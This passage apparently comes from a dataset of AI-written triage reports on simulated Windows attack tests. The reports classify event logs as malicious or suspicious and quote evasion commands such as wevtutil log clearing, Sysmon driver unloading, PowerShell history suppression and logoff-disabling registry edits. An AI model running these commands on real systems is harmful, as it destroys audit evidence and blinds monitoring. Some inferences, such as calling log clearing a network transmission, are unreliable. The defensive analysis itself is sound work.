   - Various processes are launched by `wevtutil.exe` and `cmd.exe`, which is another indication of potentially scripted or automated tasks being executed, suggesting a possible compromise.
   - Commands executed, such as `whoami.exe` and `hostname.exe`, indicate typical reconnaissance activities to gather system information.

5. **Edge Update Activities**:
   - The logs indicate activities related to Microsoft Edge Update, leading to frequent process creations and deletions. While this might be benign and related to software updates, the timing aligns closely to the event log manipulations.

#### Assessment
Given the series of actions, including log clearing using `wevtutil.exe`, changes in system time, and running reconnaissance style commands, there is plausible evidence pointing towards potentially malicious activity aimed at hiding traces of actions performed on the system.

**Indicators of Compromise**:
- The actions executed by ""admin_test"" such as clearing logs and running system information commands can be considered typical steps taken by a threat actor to cover tracks and facilitate escalation or persistence.

#### Recommendations & Resolution

1. **Immediate Action**:
   - Revoke ""admin_test"" account credentials and initiate an internal investigation. This helps prevent further unauthorized actions.
   - Conduct a thorough forensic analysis on ""Server002"" to identify any other potentially malicious tools or scripts dropped.

2. **Technical Measures**:
   - Consider increasing monitoring on ""Server002"" for any further anomalies, like unusual process creation, network traffic, or filesystem changes.
   - Examine domain level logs for any additional signs of lateral movement or privilege escalation attempts that might have occurred around the same timeframe.

3. **Security Policy Implications**:
   - Reinforce security policies regarding the auditing and reviewing of logs.
   - Ensure systems are using secure time synchronization protocols, and audit logs are shipped to a centralized and immutable log storage solution.

Given the analysis, the resolution categorization is:

**Resolution: MALICIOUS**

The series of events indicate strong evidence of malicious activity focused on covering tracks through log manipulation, which is aligned with indicators of compromise (IOCs) employed by attackers to evade detection. Immediate response and investigation are warranted."
Unload Sysmon Filter Driver,"Upon reviewing the provided Windows event logs, several indicators suggest potential malicious activity:

1. **Clearing of Event Logs**:
   - The logs show instances of log files being cleared, including the System, Security, and Windows PowerShell logs. Specifically, the events with IDs `104` and `1102` in the System and Security logs indicate the logs were cleared by the user `admin_test`, which is abnormal behavior often associated with malicious actions attempting to cover tracks.

2. **Unauthorized Process Execution**:
   - There is an attempt to unload the Sysmon driver using `fltMC.exe unload SysmonDrv` via `cmd.exe`, which is typically not done during normal operations. Sysmon is an important tool for monitoring system events, and unloading it could indicate an attempt to evade detection.

3. **Suspicious Commands**:
   - A PowerShell script checks if `SysmonDrv` is loaded and takes action based on its presence. Following this, there is an attempt to clear the Sysmon operational log using `wevtutil.com` commands. These actions suggest a deliberate attempt to disable and erase traces of Sysmon’s monitoring capability.

4. **Time Changes**:
   - There are kernel events (event ID `4616`) where the system time appears to be adjusted multiple times. Changes in system time can be a tactic to disrupt time-based detection and logging methods by confusing timestamps.

5. **High Integrity Level**: 
   - Many of the processes executing potentially malicious commands are running at a high integrity level, indicating they have significant privileges and can perform administrative tasks. This elevates the risk and potential impact of the observed actions.

Based on these findings, the behavior reflected in these logs aligns with techniques commonly associated with malicious activity, specifically evasion, anti-forensics, and maintaining persistence.

**Resolution: MALICIOUS**

**Guidance**:
- **Immediate Containment**: Isolate the impacted system (Server002) to prevent further potential harm or lateral movement.
- **Further Investigation**: Conduct a detailed forensic analysis to identify any other signs of compromise. Look for unauthorized accesses, persistence mechanisms, and any data exfiltration.
- **Review User Activities**: Investigate the actions of `admin_test` to determine if they were authenticated and authorized or the result of compromised credentials.
- **Remediation**: Reinforce security measures, including changing credentials, applying patches, and enhancing monitoring solutions.
- **Report**: Document the incident for security incident records and possibly report to relevant authorities if data breach laws require it."
Service Registry Permissions Weakness,"Upon reviewing the logs for the Windows host, several activities are flagged as suspicious and potential indicators of malicious activity:

1. **PowerShell Activity**:
    - The logs show a PowerShell script that accesses registry keys, specifically the ACL (Access Control List) for registry paths related to services and a service with the name ""weakservicename"". This action is typical in reconnaissance or enumeration steps often seen in exploits where attackers try to find vulnerabilities or misconfigured services.

2. **Event Log Clearing**:
    - The system logs indicate that the Windows Event logs, including the System, Windows PowerShell, and Security logs, were cleared by a user named ""admin_test."" This user action is suspicious as it often indicates an attempt to cover tracks after unauthorized or malicious activity. This is further confirmed by the Sysmon log showing the wevtutil.exe process used for this activity.

3. **Whoami and Task Execution**: 
    - The Sysmon logs detail the execution of the `whoami` command and the `hostname` command from the `admin_test` account, possibly to verify user context or gather system information—another marker of potentially unauthorized investigation or reconnaissance.

4. **Use of Wevtutil**:
    - The `wevtutil` command is observed multiple times, used to clear logs. This utility is typically legitimate but, in this context, supports the suspicion of event log tampering.

5. **Time Manipulation**:
    - The security logs record time adjustments performed by the `svchost.exe` process running under the LOCAL SERVICE account. While this action can be normal system operation, combined with other clearing activities, it merits further examination to rule out tampering or concealing time tracks.

6. **EdgeUpdate Activity**:
    - Extensive legitimate Microsoft Edge Update activity is noted, predominantly from the SYSTEM user account. While this in itself is not necessarily malicious, it provides a background for potentially cloaking among legitimate noise.

**Assessment**:
- While no clear, direct evidence of post-compromise actions such as payload execution or data exfiltration appears in the logs, the actions highlighted highlight potential security compromises and warrant further investigation.

**Resolution: SUSPICIOUS**

**Guidance**:
- **Further Investigation Required**:
  - Verify the legitimacy of the `admin_test` account activities, focusing on their time of access and purpose concerning cleared logs.
  - Conduct a forensic analysis of the system to discover potential malware or unauthorized access tools that might not be reflected in the logs.
  - Review network logs for unusual outbound traffic or connections around the time of these events.
  - Consider deploying advanced threat detection tools to monitor live activity.

- **Immediate Actions**:
  - Ensure appropriate logging policies are enforced, and auditing is enabled, so any future deletions or modifications are quickly detected.
  - Evaluate the security posture of services using PowerShell scripts to access or modify critical registry entries.
  - Educate administrative users on the significance of proper logging and tracking of privileged commands and activities."
Clear Event Logs via VBA,"### Analysis of the Logs:

#### Suspicious Behavior Detected:

1. **Event Log Clearing**:
   - In the Security log, Event ID 1102 indicates that the security log was cleared by the user `admin_test` (SubjectUserSid: S-1-5-21-3962163828-2803415714-1403596700-1006), which is a critical red flag as log clearing is often used by attackers to cover tracks of malicious activity.
   - In the System log, Event ID 104 indicates that both the System and Windows PowerShell event logs were cleared shortly after, again by `admin_test`.

2. **PowerShell Command Execution**:
   - Sysmon logs show suspicious PowerShell activities with command lines referencing a script from a public GitHub repository (Invoke-MalDoc.ps1). The command attempts to invoke functions typically associated with malware execution or exploitation, such as downloading and executing scripts from the internet.
   - The PowerShell log contains entries with Event ID 600 and 400 indicating the PowerShell engine being in use during the execution of this potentially malicious script.

3. **Process Execution**:
   - The execution of `wevtutil.exe` with the command to clear event logs (`cl`) is captured multiple times. This process is a legitimate Windows command-line tool but it's being used here to delete evidence of activity.

4. **Privilege Escalation and Use of High-Integrity Levels**:
   - Security logs show numerous Event ID 4672 indicating special privileges assigned to the SYSTEM account which, while common, should be noted in context with other suspicious activities.

5. **Credential Access with Event ID 5379**:
   - Several entries indicate failed attempts (ReturnCode: 3221226021) to access credentials via `MicrosoftAccount` and `WindowsLive` token, which might suggest attempts to escalate privileges or perform unauthorized access.

6. **Suspicious Network Behavior**:
   - Attempted connection or data transmission (wevtutil cl) that might align with TTPs (Techniques, Tactics, and Procedures) of clearing logs frequently executed remotely or script-based attacks.

### Assessment:

Considering the log analysis, the processes involved, and the potentially malicious intentions inferred from the activities (such as event log clearance, suspicious PowerShell command execution, and elevated privileges), it strongly indicates unauthorized access and possible malicious behavior on the system.

### Resolution:

- **MALICIOUS**: The evidence of event log clearing, suspicious PowerShell command execution invoking remote scripts, and multiple service executions in high privilege contexts suggests malicious activity. This activity, particularly targeting the CEO's machine, should be treated with the utmost concern due to potential compromise and attempted obfuscation of malicious acts. 

### Guidance on How to Proceed:

1. **Immediate Response**:
   - Isolate the affected system from the network to prevent any further malicious activity or data exfiltration.
   - Begin a thorough forensic investigation to trace back all activities leading to this point.
   - Assess if similar activities have been seen on other networked systems.

2. **Containment and Remediation**:
   - Review and reset all potentially compromised accounts, especially those with elevated privileges.
   - Update systems and patch any potential vulnerabilities that might have been exploited.

3. **Future Prevention**:
   - Audit and enhance logging and monitoring, ensuring that security logs are securely forwarded and cannot be altered without proper authorization.
   - Reinforce security awareness training focusing on recognizing suspicious behaviors and indicators of compromise.

4. **Stakeholder Communication**:
   - Inform executive leadership and relevant stakeholders, preparing them for potential fallout and ensuring clear communication plans are in place.

Given the context and domain, it is crucial to act swiftly to mitigate any further risks and understand the full scope of activity that has already taken place."
Masquerading as Windows LSASS process,"**Detailed Analysis of the Logs**

Upon analyzing the provided logs, there are several points of interest that indicate potential suspicious or malicious activity:

1. **Log Cleared Events:**
   - The events with Event ID 1102 in the Security log, Event ID 104 in the System log, and corresponding Sysmon logs indicate that event logs (Security, System, and PowerShell) have been cleared. These activities were executed by the user `admin_test`. The clearing of logs is a notable indicator of suspicious activity as attackers may attempt to erase traces of their behavior.

2. **Suspicious Process Execution:**
   - Numerous Sysmon process creation events (`ProcessGuid`s ending with `c400…c700`) show suspicious activity. The `cmd.exe` process was used to copy `cmd.exe` to `C:\Windows\Temp\lsass.exe` and execute it, which is a red flag. This mimics behavior often linked to masquerading attacks where a standard executable is renamed to something less obvious.
   - Additionally, the execution of `lsass.exe` from the temp directory (`C:\Windows\Temp\`) by admin_test suggests potential execution of malicious logic, as attackers frequently use such techniques to avoid detection.

3. **Privilege Usage:**
   - There are events indicating the assignment of a list of high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) to SYSTEM or `admin_test` (Event ID 4672). While not inherently malicious, combined with other behaviors, it adds to the suspicious nature.

4. **Failed Credential Operations:**
   - Numerous credential read failures (Event ID 5379, ReturnCode `3221226021`) related to a Microsoft account `02txoixylodcstop` are not typically expected on a standard server environment and may indicate either a misconfiguration or an attempted credential harvesting.

5. **Use of PowerShell:**
   - PowerShell was executed with scripts potentially used to perform reconnaissance or more complex operations (Event ID 600 and other PowerShell initiation events). Although PowerShell can be employed for legitimate tasks, it is also commonly used for executing scripts by attackers due to its powerful capabilities.
   - The script snippets are suspicious as they seem to automate checking the existence of certain values in `.inf` files, commonly used by attackers for information disclosure or execution via DLL hijacking methodologies.

6. **Frequent Credential Access Requests:**
   - High volume of MicrosoftAccount and token certificates access attempts in quick succession is generally suspicious. This behavior can be related to attempts to access or misuse credentials.

**Conclusion and Resolution**

Given the activity, I will categorize this set of logs as **MALICIOUS**. The combination of log-clearing events, suspicious process executions mimicking OS-level binaries, execution from insecure directory paths, unusual PowerShell activity, and failed credential operations strongly suggest possible unauthorized or malicious behavior.

**Guidance on How to Proceed**

1. **Immediate Action:**
   - Disable or isolate the affected account and machine from the network to prevent further compromise.
   - Conduct a thorough forensic investigation into copies of volatile and persistent data from the affected server or endpoint.

2. **Further Investigation:**
   - Investigate other systems or endpoints that may have communicated or shared data with the affected machine to identify any lateral movements.
   - Review logs of related or interconnected systems to check for similar malicious indicators or unusual activities.

3. **Remediation:**
   - Consider resetting passwords for affected or potentially compromised accounts.
   - Review and update security policies, including more stringent logging, regular audits, and staff training on identifying and reporting suspicious activities.
   - Strengthen application whitelisting and endpoint protection measures to avoid unauthorized executions."
Set Custom AddToHistoryHandler to Avoid History File Logging,"### Analysis

#### Suspicious Entries:

1. **Log File Clearing**:
   - **Event ID 104** in the System log indicates that the event logs for the `System` and `Windows PowerShell` were cleared by user `admin_test`.
   - **Event ID 1102** in the Security log shows that the Security log was also cleared by the same user.
   - This behavior is often associated with attempts to cover tracks, as clearing logs can hide prior unauthorized or malicious activity.

2. **Use of `wevtutil` Commands**:
   - Several instances of the `wevtutil.exe` process are seen being executed (e.g., event IDs in Sysmon logging for process ID 7036, 7012, 6660, 552, 900). This utility was used to clear logs across various channels, which corroborates the log clearing entries noted above.

3. **PowerShell Use**:
   - A PowerShell session started with a command to prevent history logging (`Set-PSReadLineOption -AddToHistoryHandler { return $false }`), as indicated in Powershell log entries and corresponding Sysmon logs (Process ID 2184).
   - Such actions within PowerShell could be used to execute commands without leaving evidence in command history, which is a technique often used in malicious activities.

4. **Correlated Log Entries**:
   - The sequence of events, starting with PowerShell invocation with history suppression, followed by the use of `wevtutil` to clear logs, and the subsequent log removal entry, creates a narrative of potentially nefarious activity designed to evade detection.

#### Non-Suspicious Entries:

1. **Regular System Activities**:
   - Processes related to Windows updates, such as executions of `MicrosoftEdgeUpdate.exe` and its associated components, are seen repeatedly in various stages of execution.
   - These activities appear to be routine system updates and do not align with the timeframe or pattern of the malicious behavior outlined.

### Assessment and Recommendation

The combination of actions by the user `admin_test`, specifically the use of tools to clear logs and suppress PowerShell history, strongly indicates efforts to conceal potentially unauthorized activities. This pattern is indicative of a compromise or malicious intent, aimed at obscuring the user's actions on the system.

### Resolution

**MALICIOUS** - The logs contain clear indicators of malicious activity, primarily characterized by log clearing and PowerShell misuse for obfuscation purposes. Immediate investigation into the actions performed by the `admin_test` user during the log clearing event is recommended. Additionally, ensure the affected system (`Server002`) is secured, potentially isolating it from the network until a thorough investigation is conducted."
Disable Windows LogOff Button,"### Investigation Summary:

Upon analyzing the logs provided for Server002, several patterns and events raise concerns regarding potential malicious activity:

1. **Process Execution and Command-Line Usage**:  
   - Multiple instances of `wevtutil.exe` were executed with command-line arguments such as `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, and `cl ""Windows PowerShell""`. These commands suggest that the `wevtutil` utility was used to clear a variety of event logs, which is a common tactic used to cover up malicious actions.
   - `cmd.exe` was executed with commands altering the registry to disable logoff options:  
     ```plaintext
     reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoLogOff /t REG_DWORD /d 1 /f
     reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v StartMenuLogOff /t REG_DWORD /d 1 /f
     ```
     This indicates possible attempts to modify system policies without user consent.

2. **Log Cleared Events**:
   - Application, System, and Security logs were reported as cleared by the user `SERVER002\admin_test`. Events with IDs `104` in the System log and `1102` in the Security log indicate that log files have been cleared. This activity is strongly associated with attempts to erase tracks of potential unauthorized actions.

3. **Privilege Level**:
   - Many processes were executed with high integrity levels, implying administrative privileges were likely used.

4. **Event Timing**:
   - All suspicious activities appear to occur within a very short timeframe, suggesting a coordinated execution possibly by an automated script or tool.

### Assessment:

The sequence of activities seen in the logs, including numerous instances of `wevtutil.exe` usage to clear logs, running `cmd.exe` to alter system policies, and clearing event logs, strongly indicates attempts to cover up potentially unauthorized or harmful activities. This behavior is consistent with tactics, techniques, and procedures (TTPs) used by threat actors during a compromise.

### Threats and Risks Identified:

- Potential compromise of `SERVER002\admin_test` account, likely used to perform unauthorized administration-level tasks.
- High risk of undetected malware activity due to the clearing of logs.
- Potential changes to the system configurations and policies that could weaken security posture.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Isolate Server002 from the network to prevent further potential exfiltration or malicious activities.
   - Engage incident response procedures, involving a full forensic investigation of the host.
   - Audit all privileged accounts and reset passwords, especially for `admin_test`.

2. **Investigative Actions**:
   - Perform full disk forensics on Server002 to identify additional indicators of compromise.
   - Analyze network traffic associated with Server002 for anomalous behavior.

3. **Preventative Measures**:
   - Review and strengthen access control policies.
   - Implement monitoring and alerts for log clearing activities, especially under Event IDs 1102 and 104.

### Resolution:

**MALICIOUS** - The activities documented in the logs are consistent with malicious actions intended to cover tracks and potentially compromise the system further. Immediate containment and investigation are warranted."
Extract binary files via VBA,"Upon investigating the provided Windows logs for the server titled ""Server002"", several indicators suggest malicious activity, or at the very least, activity typical of a security breach or unauthorized use:

1. **Log File Clearing:** 
   - The `System`, `Windows PowerShell`, and `Security` channel logs have been cleared at approximately the same time. Clearing event logs is a strong indicator of malicious attempts to cover tracks, as adversaries often clear logs to remove evidence of their presence or activities.

2. **Suspicious PowerShell Activity:**
   - The PowerShell logs show execution of a PowerShell script that imports and executes a script from a remote URL. The use of `Invoke-MalDoc` suggests the processing of a malicious document, which is a known technique. 
   - The script reads content from a file (possibly a macro file), replaces specific text in this content, sets a security protocol, and then executes content fetched from an external source (`https://raw.githubusercontent.com`). This behavior is highly indicative of a PowerShell-based attack.

3. **Wevtutil Usage (Sysmon Logs):**
   - There are multiple entries for `wevtutil`, a Windows utility for event log management, being used to clear logs. The command line specifies the clearance of event logs (`cl`), corroborating the suspicious log-clearing observed in other logs.
   - The persistent high-integrity processes associated with log clearance further suggest attempts at privilege use or elevation.

4. **Other Process Executions:**
   - The execution of typical system utilities like `whoami.exe` and `hostname.exe` might be part of typical post-exploitation reconnaissance to ascertain information about the compromised system context.
   - Historical tools usage (WmiPrvSE.exe) might indicate lateral movement attempts or remote command execution.

Based on the suspicious clearing of event logs, the execution of PowerShell commands fetching and executing potential malicious scripts from external URLs, and the typical command-line utility usage pattern by `admin_test`, there appears to be a compromise of the system in question.

**Final Assessment:** MALICIOUS

**Guidance on Proceeding:**
- Immediately isolate the affected system to prevent further potential for lateral movement and data exfiltration.
- Conduct a forensic analysis to recover deleted logs and understand the extent of the compromise.
- Review and potentially reset all credentials that might have been used on this system.
- Scan for and remove any suspicious or malicious software from the host.
- Implement further monitoring and security controls to prevent similar incidents, possibly including endpoint protection and logging solutions with more granular oversight."
Bypass UAC using SilentCleanup task,"## Detailed Log Analysis:

### Identified Indicators of Malicious Activity:

1. **Event Log Clearing:**
   - The logs indicate that multiple event logs were cleared, which is a known tactic used by attackers to cover their tracks. Specifically:
     - **Security Log**: Cleared by `admin_test` (Event ID 1102).
     - **System Log**: Cleared entries (Event ID 104) by `admin_test`.
     - The process `wevtutil.exe` is responsible for these actions, and it ran several times (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, `cl ""Windows PowerShell""`).
     - High integrity level for these actions suggests use of an account with elevated privileges.
     - `wsmprovhost.exe` as the parent process suggests potential use of Windows Remote Management (WinRM) services which could be used in lateral movement.

2. **Suspicious Process Executions:**
   - Execution of `cmd.exe` from a temporary directory pointing to a known filename `T1548.002.bat` suggests the execution of a file related to technique `T1548.002` which involves bypassing User Account Control, a known tactic among attackers.
   - Multiple instances of conhost.exe linked to various suspicious parent processes (e.g., cmd.exe and wevtutil.exe) could indicate command shell access or script execution from unexpected locations.

3. **Executable in Temp Directory:**
   - Execution of `MicrosoftEdgeUpdate.exe` from within a Temp directory is uncommon and can indicate misuse or an attempt to execute a modified or malicious payload stored in an unusual directory.

### Assessment:

- The evidence suggests that there was a concerted effort to conceal activity on the system through log clearing, likely with the use of a compromised privileged account (`SERVER002\admin_test`), suggesting potential account misuse or compromise.
- The execution of scripts potentially linked to UAC bypass further raises the likelihood of persistence or privilege escalation attempts.
- The use of `wsmprovhost.exe` indicates the likelihood of remote command execution or configuration changes, further pointing towards possible lateral movement within the network.

### Threats and Risks Identified:

- **Privilege Escalation and Evasion**: The clearing of logs is a significant indicator of privilege misuse and an attempt at evasion.
- **Persistence Mechanisms in Use**: The execution of scripts from temporary directories suggests potential attempts to establish persistence.
- **Potential for Further Compromise**: The behavior observed suggests an actor with at least partial control of the system, with the potential to carry out further malicious activities.

### Guidance and Resolution:

1. **Resolution**: **MALICIOUS**
   - The logs contain confirmed malicious activity consistent with evasion (log clearing), potential privilege escalation, and command execution from a high-privilege account pointing to TTPs commonly associated with threat actor behavior.

2. **Immediate Actions Recommended:**
   - **Account Investigation**: Thoroughly investigate the `admin_test` account for any unauthorized access or permissions anomalies.
   - **Containment**: Isolate the machine `Server002` to prevent further spread or malicious activities.
   - **Forensic Analysis**: Perform deeper forensic analysis on the memory and disk to identify other indicators of compromise.
   - **Review Remote Connections**: Assess logs for initiation and patterns of Windows Remote Management (WinRM) or other remote access vectors.
   - **Patch and Update**: Secure known vulnerabilities that might have been exploited and ensure all software is up to date.
   - **User and Entity Behavior Analytics (UEBA)**: Employ advanced analytics to detect abnormal patterns across the network. 

3. **Further Investigations:**
   - Look into the broader network, especially other machines accessible from `Server002`, to check for lateral movement or propagation of malicious activities.

This situation requires urgent response and detailed investigation as it presents a clear risk of continued unauthorized actions that could lead to significant data breach or system integrity compromise."
Invoke HTML Application - Simulate Lateral Movement over UNC Path,"Based on the information provided through the various event logs, there are several indicators of potential malicious activities on the device, ""Server002"". Here's the detailed assessment:

### Suspicious PowerShell Activities

1. **PowerShell Execution with Unusual Command**:
   - The PowerShell logs indicate that a command was executed using `powershell.exe` with `Invoke-ATHHTMLApplication` and using `mshta.exe`. This is highly suspicious, as `mshta.exe` is often used by attackers to execute HTML application files that may contain malicious scripts.

```plaintext
HostApplication=powershell.exe & {Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe}
```

### Log Cleared Events

2. **Clearing of Event Logs**:
   - Events from the Security, System, and PowerShell log channels are cleared by the same user ""admin_test"". The clearing of logs is generally a post-exploitation activity, usually following malicious activities to cover tracks.

- **Security Event ID 1102**: Security logs cleared.
- **System/EventLog 104**: System log and Windows PowerShell log cleared.

### Sysmon - Suspicious Process and Command Line Activities

3. **Clearing Events via `wevtutil`**:
   - The `wevtutil.exe` was used multiple times to clear various logs (`Security`, `System`, `Application`, `Windows PowerShell`).
   - `wevtutil.exe` usage patterns for clearing logs suggests an attempt to remove traces of certain activities:
  
```plaintext
""C:\Windows\system32\wevtutil.exe"" cl Security
""C:\Windows\system32\wevtutil.exe"" cl System
""C:\Windows\system32\wevtutil.exe"" cl Application
```

4. **Exporting Logs with `wevtutil`**:
   - Additionally, `wevtutil.exe` was used to export logs, which might be preparatory work before log clearing or for data exfiltration:

```plaintext
""C:\Windows\system32\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\Users\ADMIN_~1\AppData\Local\Temp\TempLog.evtx
```

### Potential Indicators of Compromise

- **Parent and Child Process Correlation**:
    - Processes `wevtutil.exe`, `conhost.exe`, and `PowerShell.exe` show direct relationship and linkage, which could imply orchestration of actions related to malicious activities.
  
### Conclusion and Resolution

Given the combination of:
- Unusual PowerShell execution involving `mshta.exe`.
- Multiple log clearing events.
- Use of `wevtutil.exe` to clear and export logs.

This strongly suggests deliberate actions aligning with known tactics used in system compromise and data exfiltration or attack staging processes.

**Resolution: MALICIOUS**

### Guidance on Next Steps

- **Immediate Response**: Isolate the affected system (Server002) from the network to contain potential threats.
- **Forensic Analysis**: Conduct a full forensic investigation on Server002 to gather more context about the compromised activities.
- **User Review**: Investigate the actions and access related to the `admin_test` account, as it is directly tied to suspicious activities.
- **Patch and Update**: Ensure that all systems and applications are fully patched and updated to mitigate vulnerabilities.
- **Monitoring and Logs**: Enhance monitoring of high-value systems for anomalous activities and run periodic reviews of logs to detect unusual patterns."
Execution of HTA and VBS Files using Rundll32 and URL.dll,"### Detailed Analysis

The logs provided contain several indicators of potentially malicious activity. Below is a detailed analysis of these logs:

#### Security Log
1. **Log Clearing Activities**: 
   - **EventID 1102** indicates that the security log has been cleared by a user, `admin_test`, on `Server002`. This is highly suspicious because log clearing can be an attempt to cover tracks after malicious activity.
   - Similarly, the **System logs** (EventID 104) have also been cleared by the same user.

#### System Log
1. **Time Discrepancies**:
   - **EventID 4616** shows changes in the system time by the `svchost.exe` process. While time sync operations can be legitimate, adjustments right after log clearance are suspicious and potentially an attempt to confuse timestamp-based tracking.

#### Sysmon Log
1. **Suspicious Process Execution**:
   - There is frequent usage of `wevtutil.exe` by `admin_test` to clear logs (`CommandLine: cl Security`, `cl System`, and `cl ""Windows PowerShell""`). Clearing logs is an unusual and suspicious action, especially when executed via command line and more than one log at a time.
   - **Unusual Activity**: A command (`cmd.exe /c rundll32.exe url.dll,OpenURL ...`) was executed to run a `.hta` (HTML Application) and a `.vbs` (VBScript file). These actions are characteristic of techniques used to execute code from an external source, potentially indicative of a compromise or attempted exploitation.

2. **Use of `cmd.exe`, `rundll32.exe`, and `.hta`**:
   - The **CommandLine value** is executing a .hta file and a .vbs script from a temporary directory related to Atomic Red Team, a known pen-testing and red-teaming toolkit. This suggests an imitation or actual pen-testing activity, which would need confirmation if legitimate or unauthorized.

3. **Repeated Execution of Windows Utilities**:
   - Various instances of `conhost.exe` and `whoami.exe` executions by the `admin_test` user. While these might sometimes be benign, in the context of the other suspicious activities, they warrant caution.

#### Application Log
1. **Security Product State**:
   - Log entry shows Windows Defender is enabled (EventID 15). This alone doesn’t indicate malicious activity but is important information for understanding the defensive posture of the system.

### Assessment

The logs provided show a sequence of activities that strongly suggest an attempt to cover tracks (log clearance) combined with potentially malicious payload execution from temporary directories. The use of standard utilities, like `wevtutil`, `rundll32`, and execution of .hta and .vbs scripts, aligns with tactics often employed in malicious operations.

- **Resolution**: MALICIOUS

### Guidance

- **Immediate Actions**:
  - **Containment**: Isolate `Server002` from the network to prevent potential spread or data exfiltration.
  - **Forensics**: Collect a memory snapshot and disk image for detailed investigation.
  - **Analysis of Scripts**: Review the .hta and .vbs scripts mentioned in the logs to understand their intent and origin.
  - **Audit User**: Review the actions and potentially restrict the `admin_test` account.

- **Long-term Measures**:
  - **Enhanced Monitoring**: Enable auditing and regular review of event logs, especially for sensitive roles and accounts.
  - **Review Access Policies**: Ensure that least privilege principles are in place, especially for users with administrative access.
  - **Security Awareness**: Provide training to users about the risks associated with unauthorized scripts and utilities execution."
LOLBAS CustomShellHost to Spawn Process,"Upon reviewing the provided Windows event logs, several indicators suggest potential malicious activity that requires further investigation. Here is a detailed analysis:

1. **Sysmon Events:**
   - Multiple instances of `wevtutil.exe` were executed to clear event logs of various channels (Sysmon, Application, System, Security, and Windows PowerShell). The command lines used (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`) are indicative of attempts to cover tracks, which is a common technique used by attackers after performing malicious actions.
   - The PowerShell command executed appears to try to create a directory `C:\test`, copy a suspicious executable `customshellhost.exe`, and execute it. This behavior is indicative of lateral movement or persistence attempts.

2. **System and Security Logs:**
   - Event ID 104 and 1102 from Microsoft-Windows-Eventlog indicate that the system and security event logs were cleared, which is an unusual and suspicious activity, typically performed to hide malicious activities.

3. **PowerShell Logs:**
   - The execution of a PowerShell script that creates a directory, copies executables, and executes them is suspicious, especially when it includes modifying or executing system binaries like `calc.exe` under a different name (`explorer.exe`), which could be used to mask the launch of a different executable.

4. **Indicators of Hiding Operations:**
   - The clearing of event logs across multiple channels strongly suggests an attempt to remove evidence of potentially malicious actions, which is often associated with a security breach.

**Assessment:**

The logs evidence potentially malicious activity, primarily aimed at erasing tracks. The combination of logging cleaning, the execution of PowerShell scripts with suspicious intents, and the manipulation or renaming of executables strongly suggest a compromised system.

**Recommendation:**

- **Immediate Action:** Isolate the affected machine (`Server002`) to prevent lateral movement or further exploitation within the network.
- **Detailed Investigation:** Conduct a comprehensive forensic analysis to identify the origin of the attack, all affected systems and data, and trace any potential data exfiltration.
- **Remediation Steps:** Consider re-imaging the compromised system to ensure all malware is removed and implement enhanced monitoring and alerting.

Given the analysis, the resolution is **MALICIOUS**. This host shows clear signs of a security breach and requires thorough investigation and response."
InfDefaultInstall.exe .inf Execution,"Upon reviewing the provided Windows event logs, several indicators of potentially malicious activity and anomalous behavior are apparent. Here is a detailed analysis of the suspicious activities recorded in the logs:

1. **Log Clearing Activity:**
   - The event logs indicate multiple instances of log clearing activities:
     - Security log clearing (EventID 1102) attributed to the user `admin_test`.
     - System log clearing (EventID 104) by the user `admin_test`.
     - Windows PowerShell log clearing also attributed to `admin_test`.
   - Clearing event logs is a common practice performed by attackers attempting to cover their tracks after compromising a system.

2. **Execution of Suspicious Processes:**
   - The Command Line Utility (wevtutil.exe) is frequently observed in the logs with commands that suggest it was used to clear logs, e.g., `""wevtutil.exe cl Microsoft-Windows-Sysmon/Operational""`.
   - The use of `InfDefaultInstall.exe`, which is outside typical update processes for Microsoft Edge, in conjunction with the Microsoft Edge Update process may suggest an attempt at living-off-the-land or misuse of trusted binaries.

3. **PowerShell Execution:**
   - A `powershell.exe` process was executed by the `admin_test` user around the time of log-clearing activities, though the specific commands executed are not detailed in the logs. This matches typical behavior seen in potentially malicious scenarios where PowerShell scripts are used for malicious activities due to their flexibility and power.

4. **Behavior Context:**
   - The recurrence of the `admin_test` username in actions related to system-level tasks and log manipulation suggests that the user account might either be compromised or directly involved in unauthorized activities.
   - System logs have events indicating actions that typically require administrative privileges, which could point to privilege misuse or escalation.

Given these findings, the activities outlined in the logs, particularly the clearing of logs and execution of system-level utilities with potentially unauthorized intent, indicate that these are not normal operations for a monitored and secured environment.

### Resolution: MALICIOUS

There is clear evidence suggesting that the activities logged are indicative of an unauthorized user attempting to mask potentially malicious actions through log manipulation and misuse of privileges. Immediate steps should include:

- Investigate any anomalies associated with the `admin_test` account, potentially suspending or isolating it until a detailed review is completed.
- Conduct a full audit of all accounts and permissions on the system in question to identify and remediate potential privilege escalation paths.
- Analyze network traffic and any additional logs that could provide further insights into unauthorized access or data exfiltration attempts.
- Implement enhanced monitoring and alerting for unusual activities, particularly focusing on log management and administrative actions.

These steps aim to mitigate the risk and prevent further unauthorized access or data compromise."
Snake Malware Registry Blob,"**Detailed Log Analysis:**

Upon reviewing the provided logs, several indicators suggest potentially malicious activity:

1. **PowerShell Activity:**
   - The PowerShell logs reveal the execution of a script that modifies the Windows Registry at a path (`HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds`) and insert a registry key named ""AtomicSnake"" populated with random byte data. This behavior is highly suspicious given that such registry changes are not typical for standard operations and can be used for persisting malware or altering the operating system's behavior maliciously.

2. **Event Log Clearing:**
   - The security log contains an event with ID `1102` indicating the security event log was cleared. Similarly, the system log also shows clearing events, which are suspicious because attackers often clear logs to cover their tracks after executing a malicious action.

3. **Sysmon Logs:**
   - A series of Sysmon logs indicate the usage of the `wevtutil.exe cl` command to clear event logs (`Sysmon`, `Application`, `System`, `Security`) by a user `admin_test`. The execution of `wevtutil.exe` for log clearing by an administrative user without any routine administrative actions suggest malicious intent, particularly when immediately followed by registry manipulations using PowerShell.

4. **High-Integrity Level Execution:**
   - Multiple processes, including PowerShell and `wevtutil.exe`, are executed with a high integrity level, indicating they were run with administrative privileges, facilitating potentially harmful modifications to the system.

**Assessment of the Situation:**

Based on the analysis of the logs:

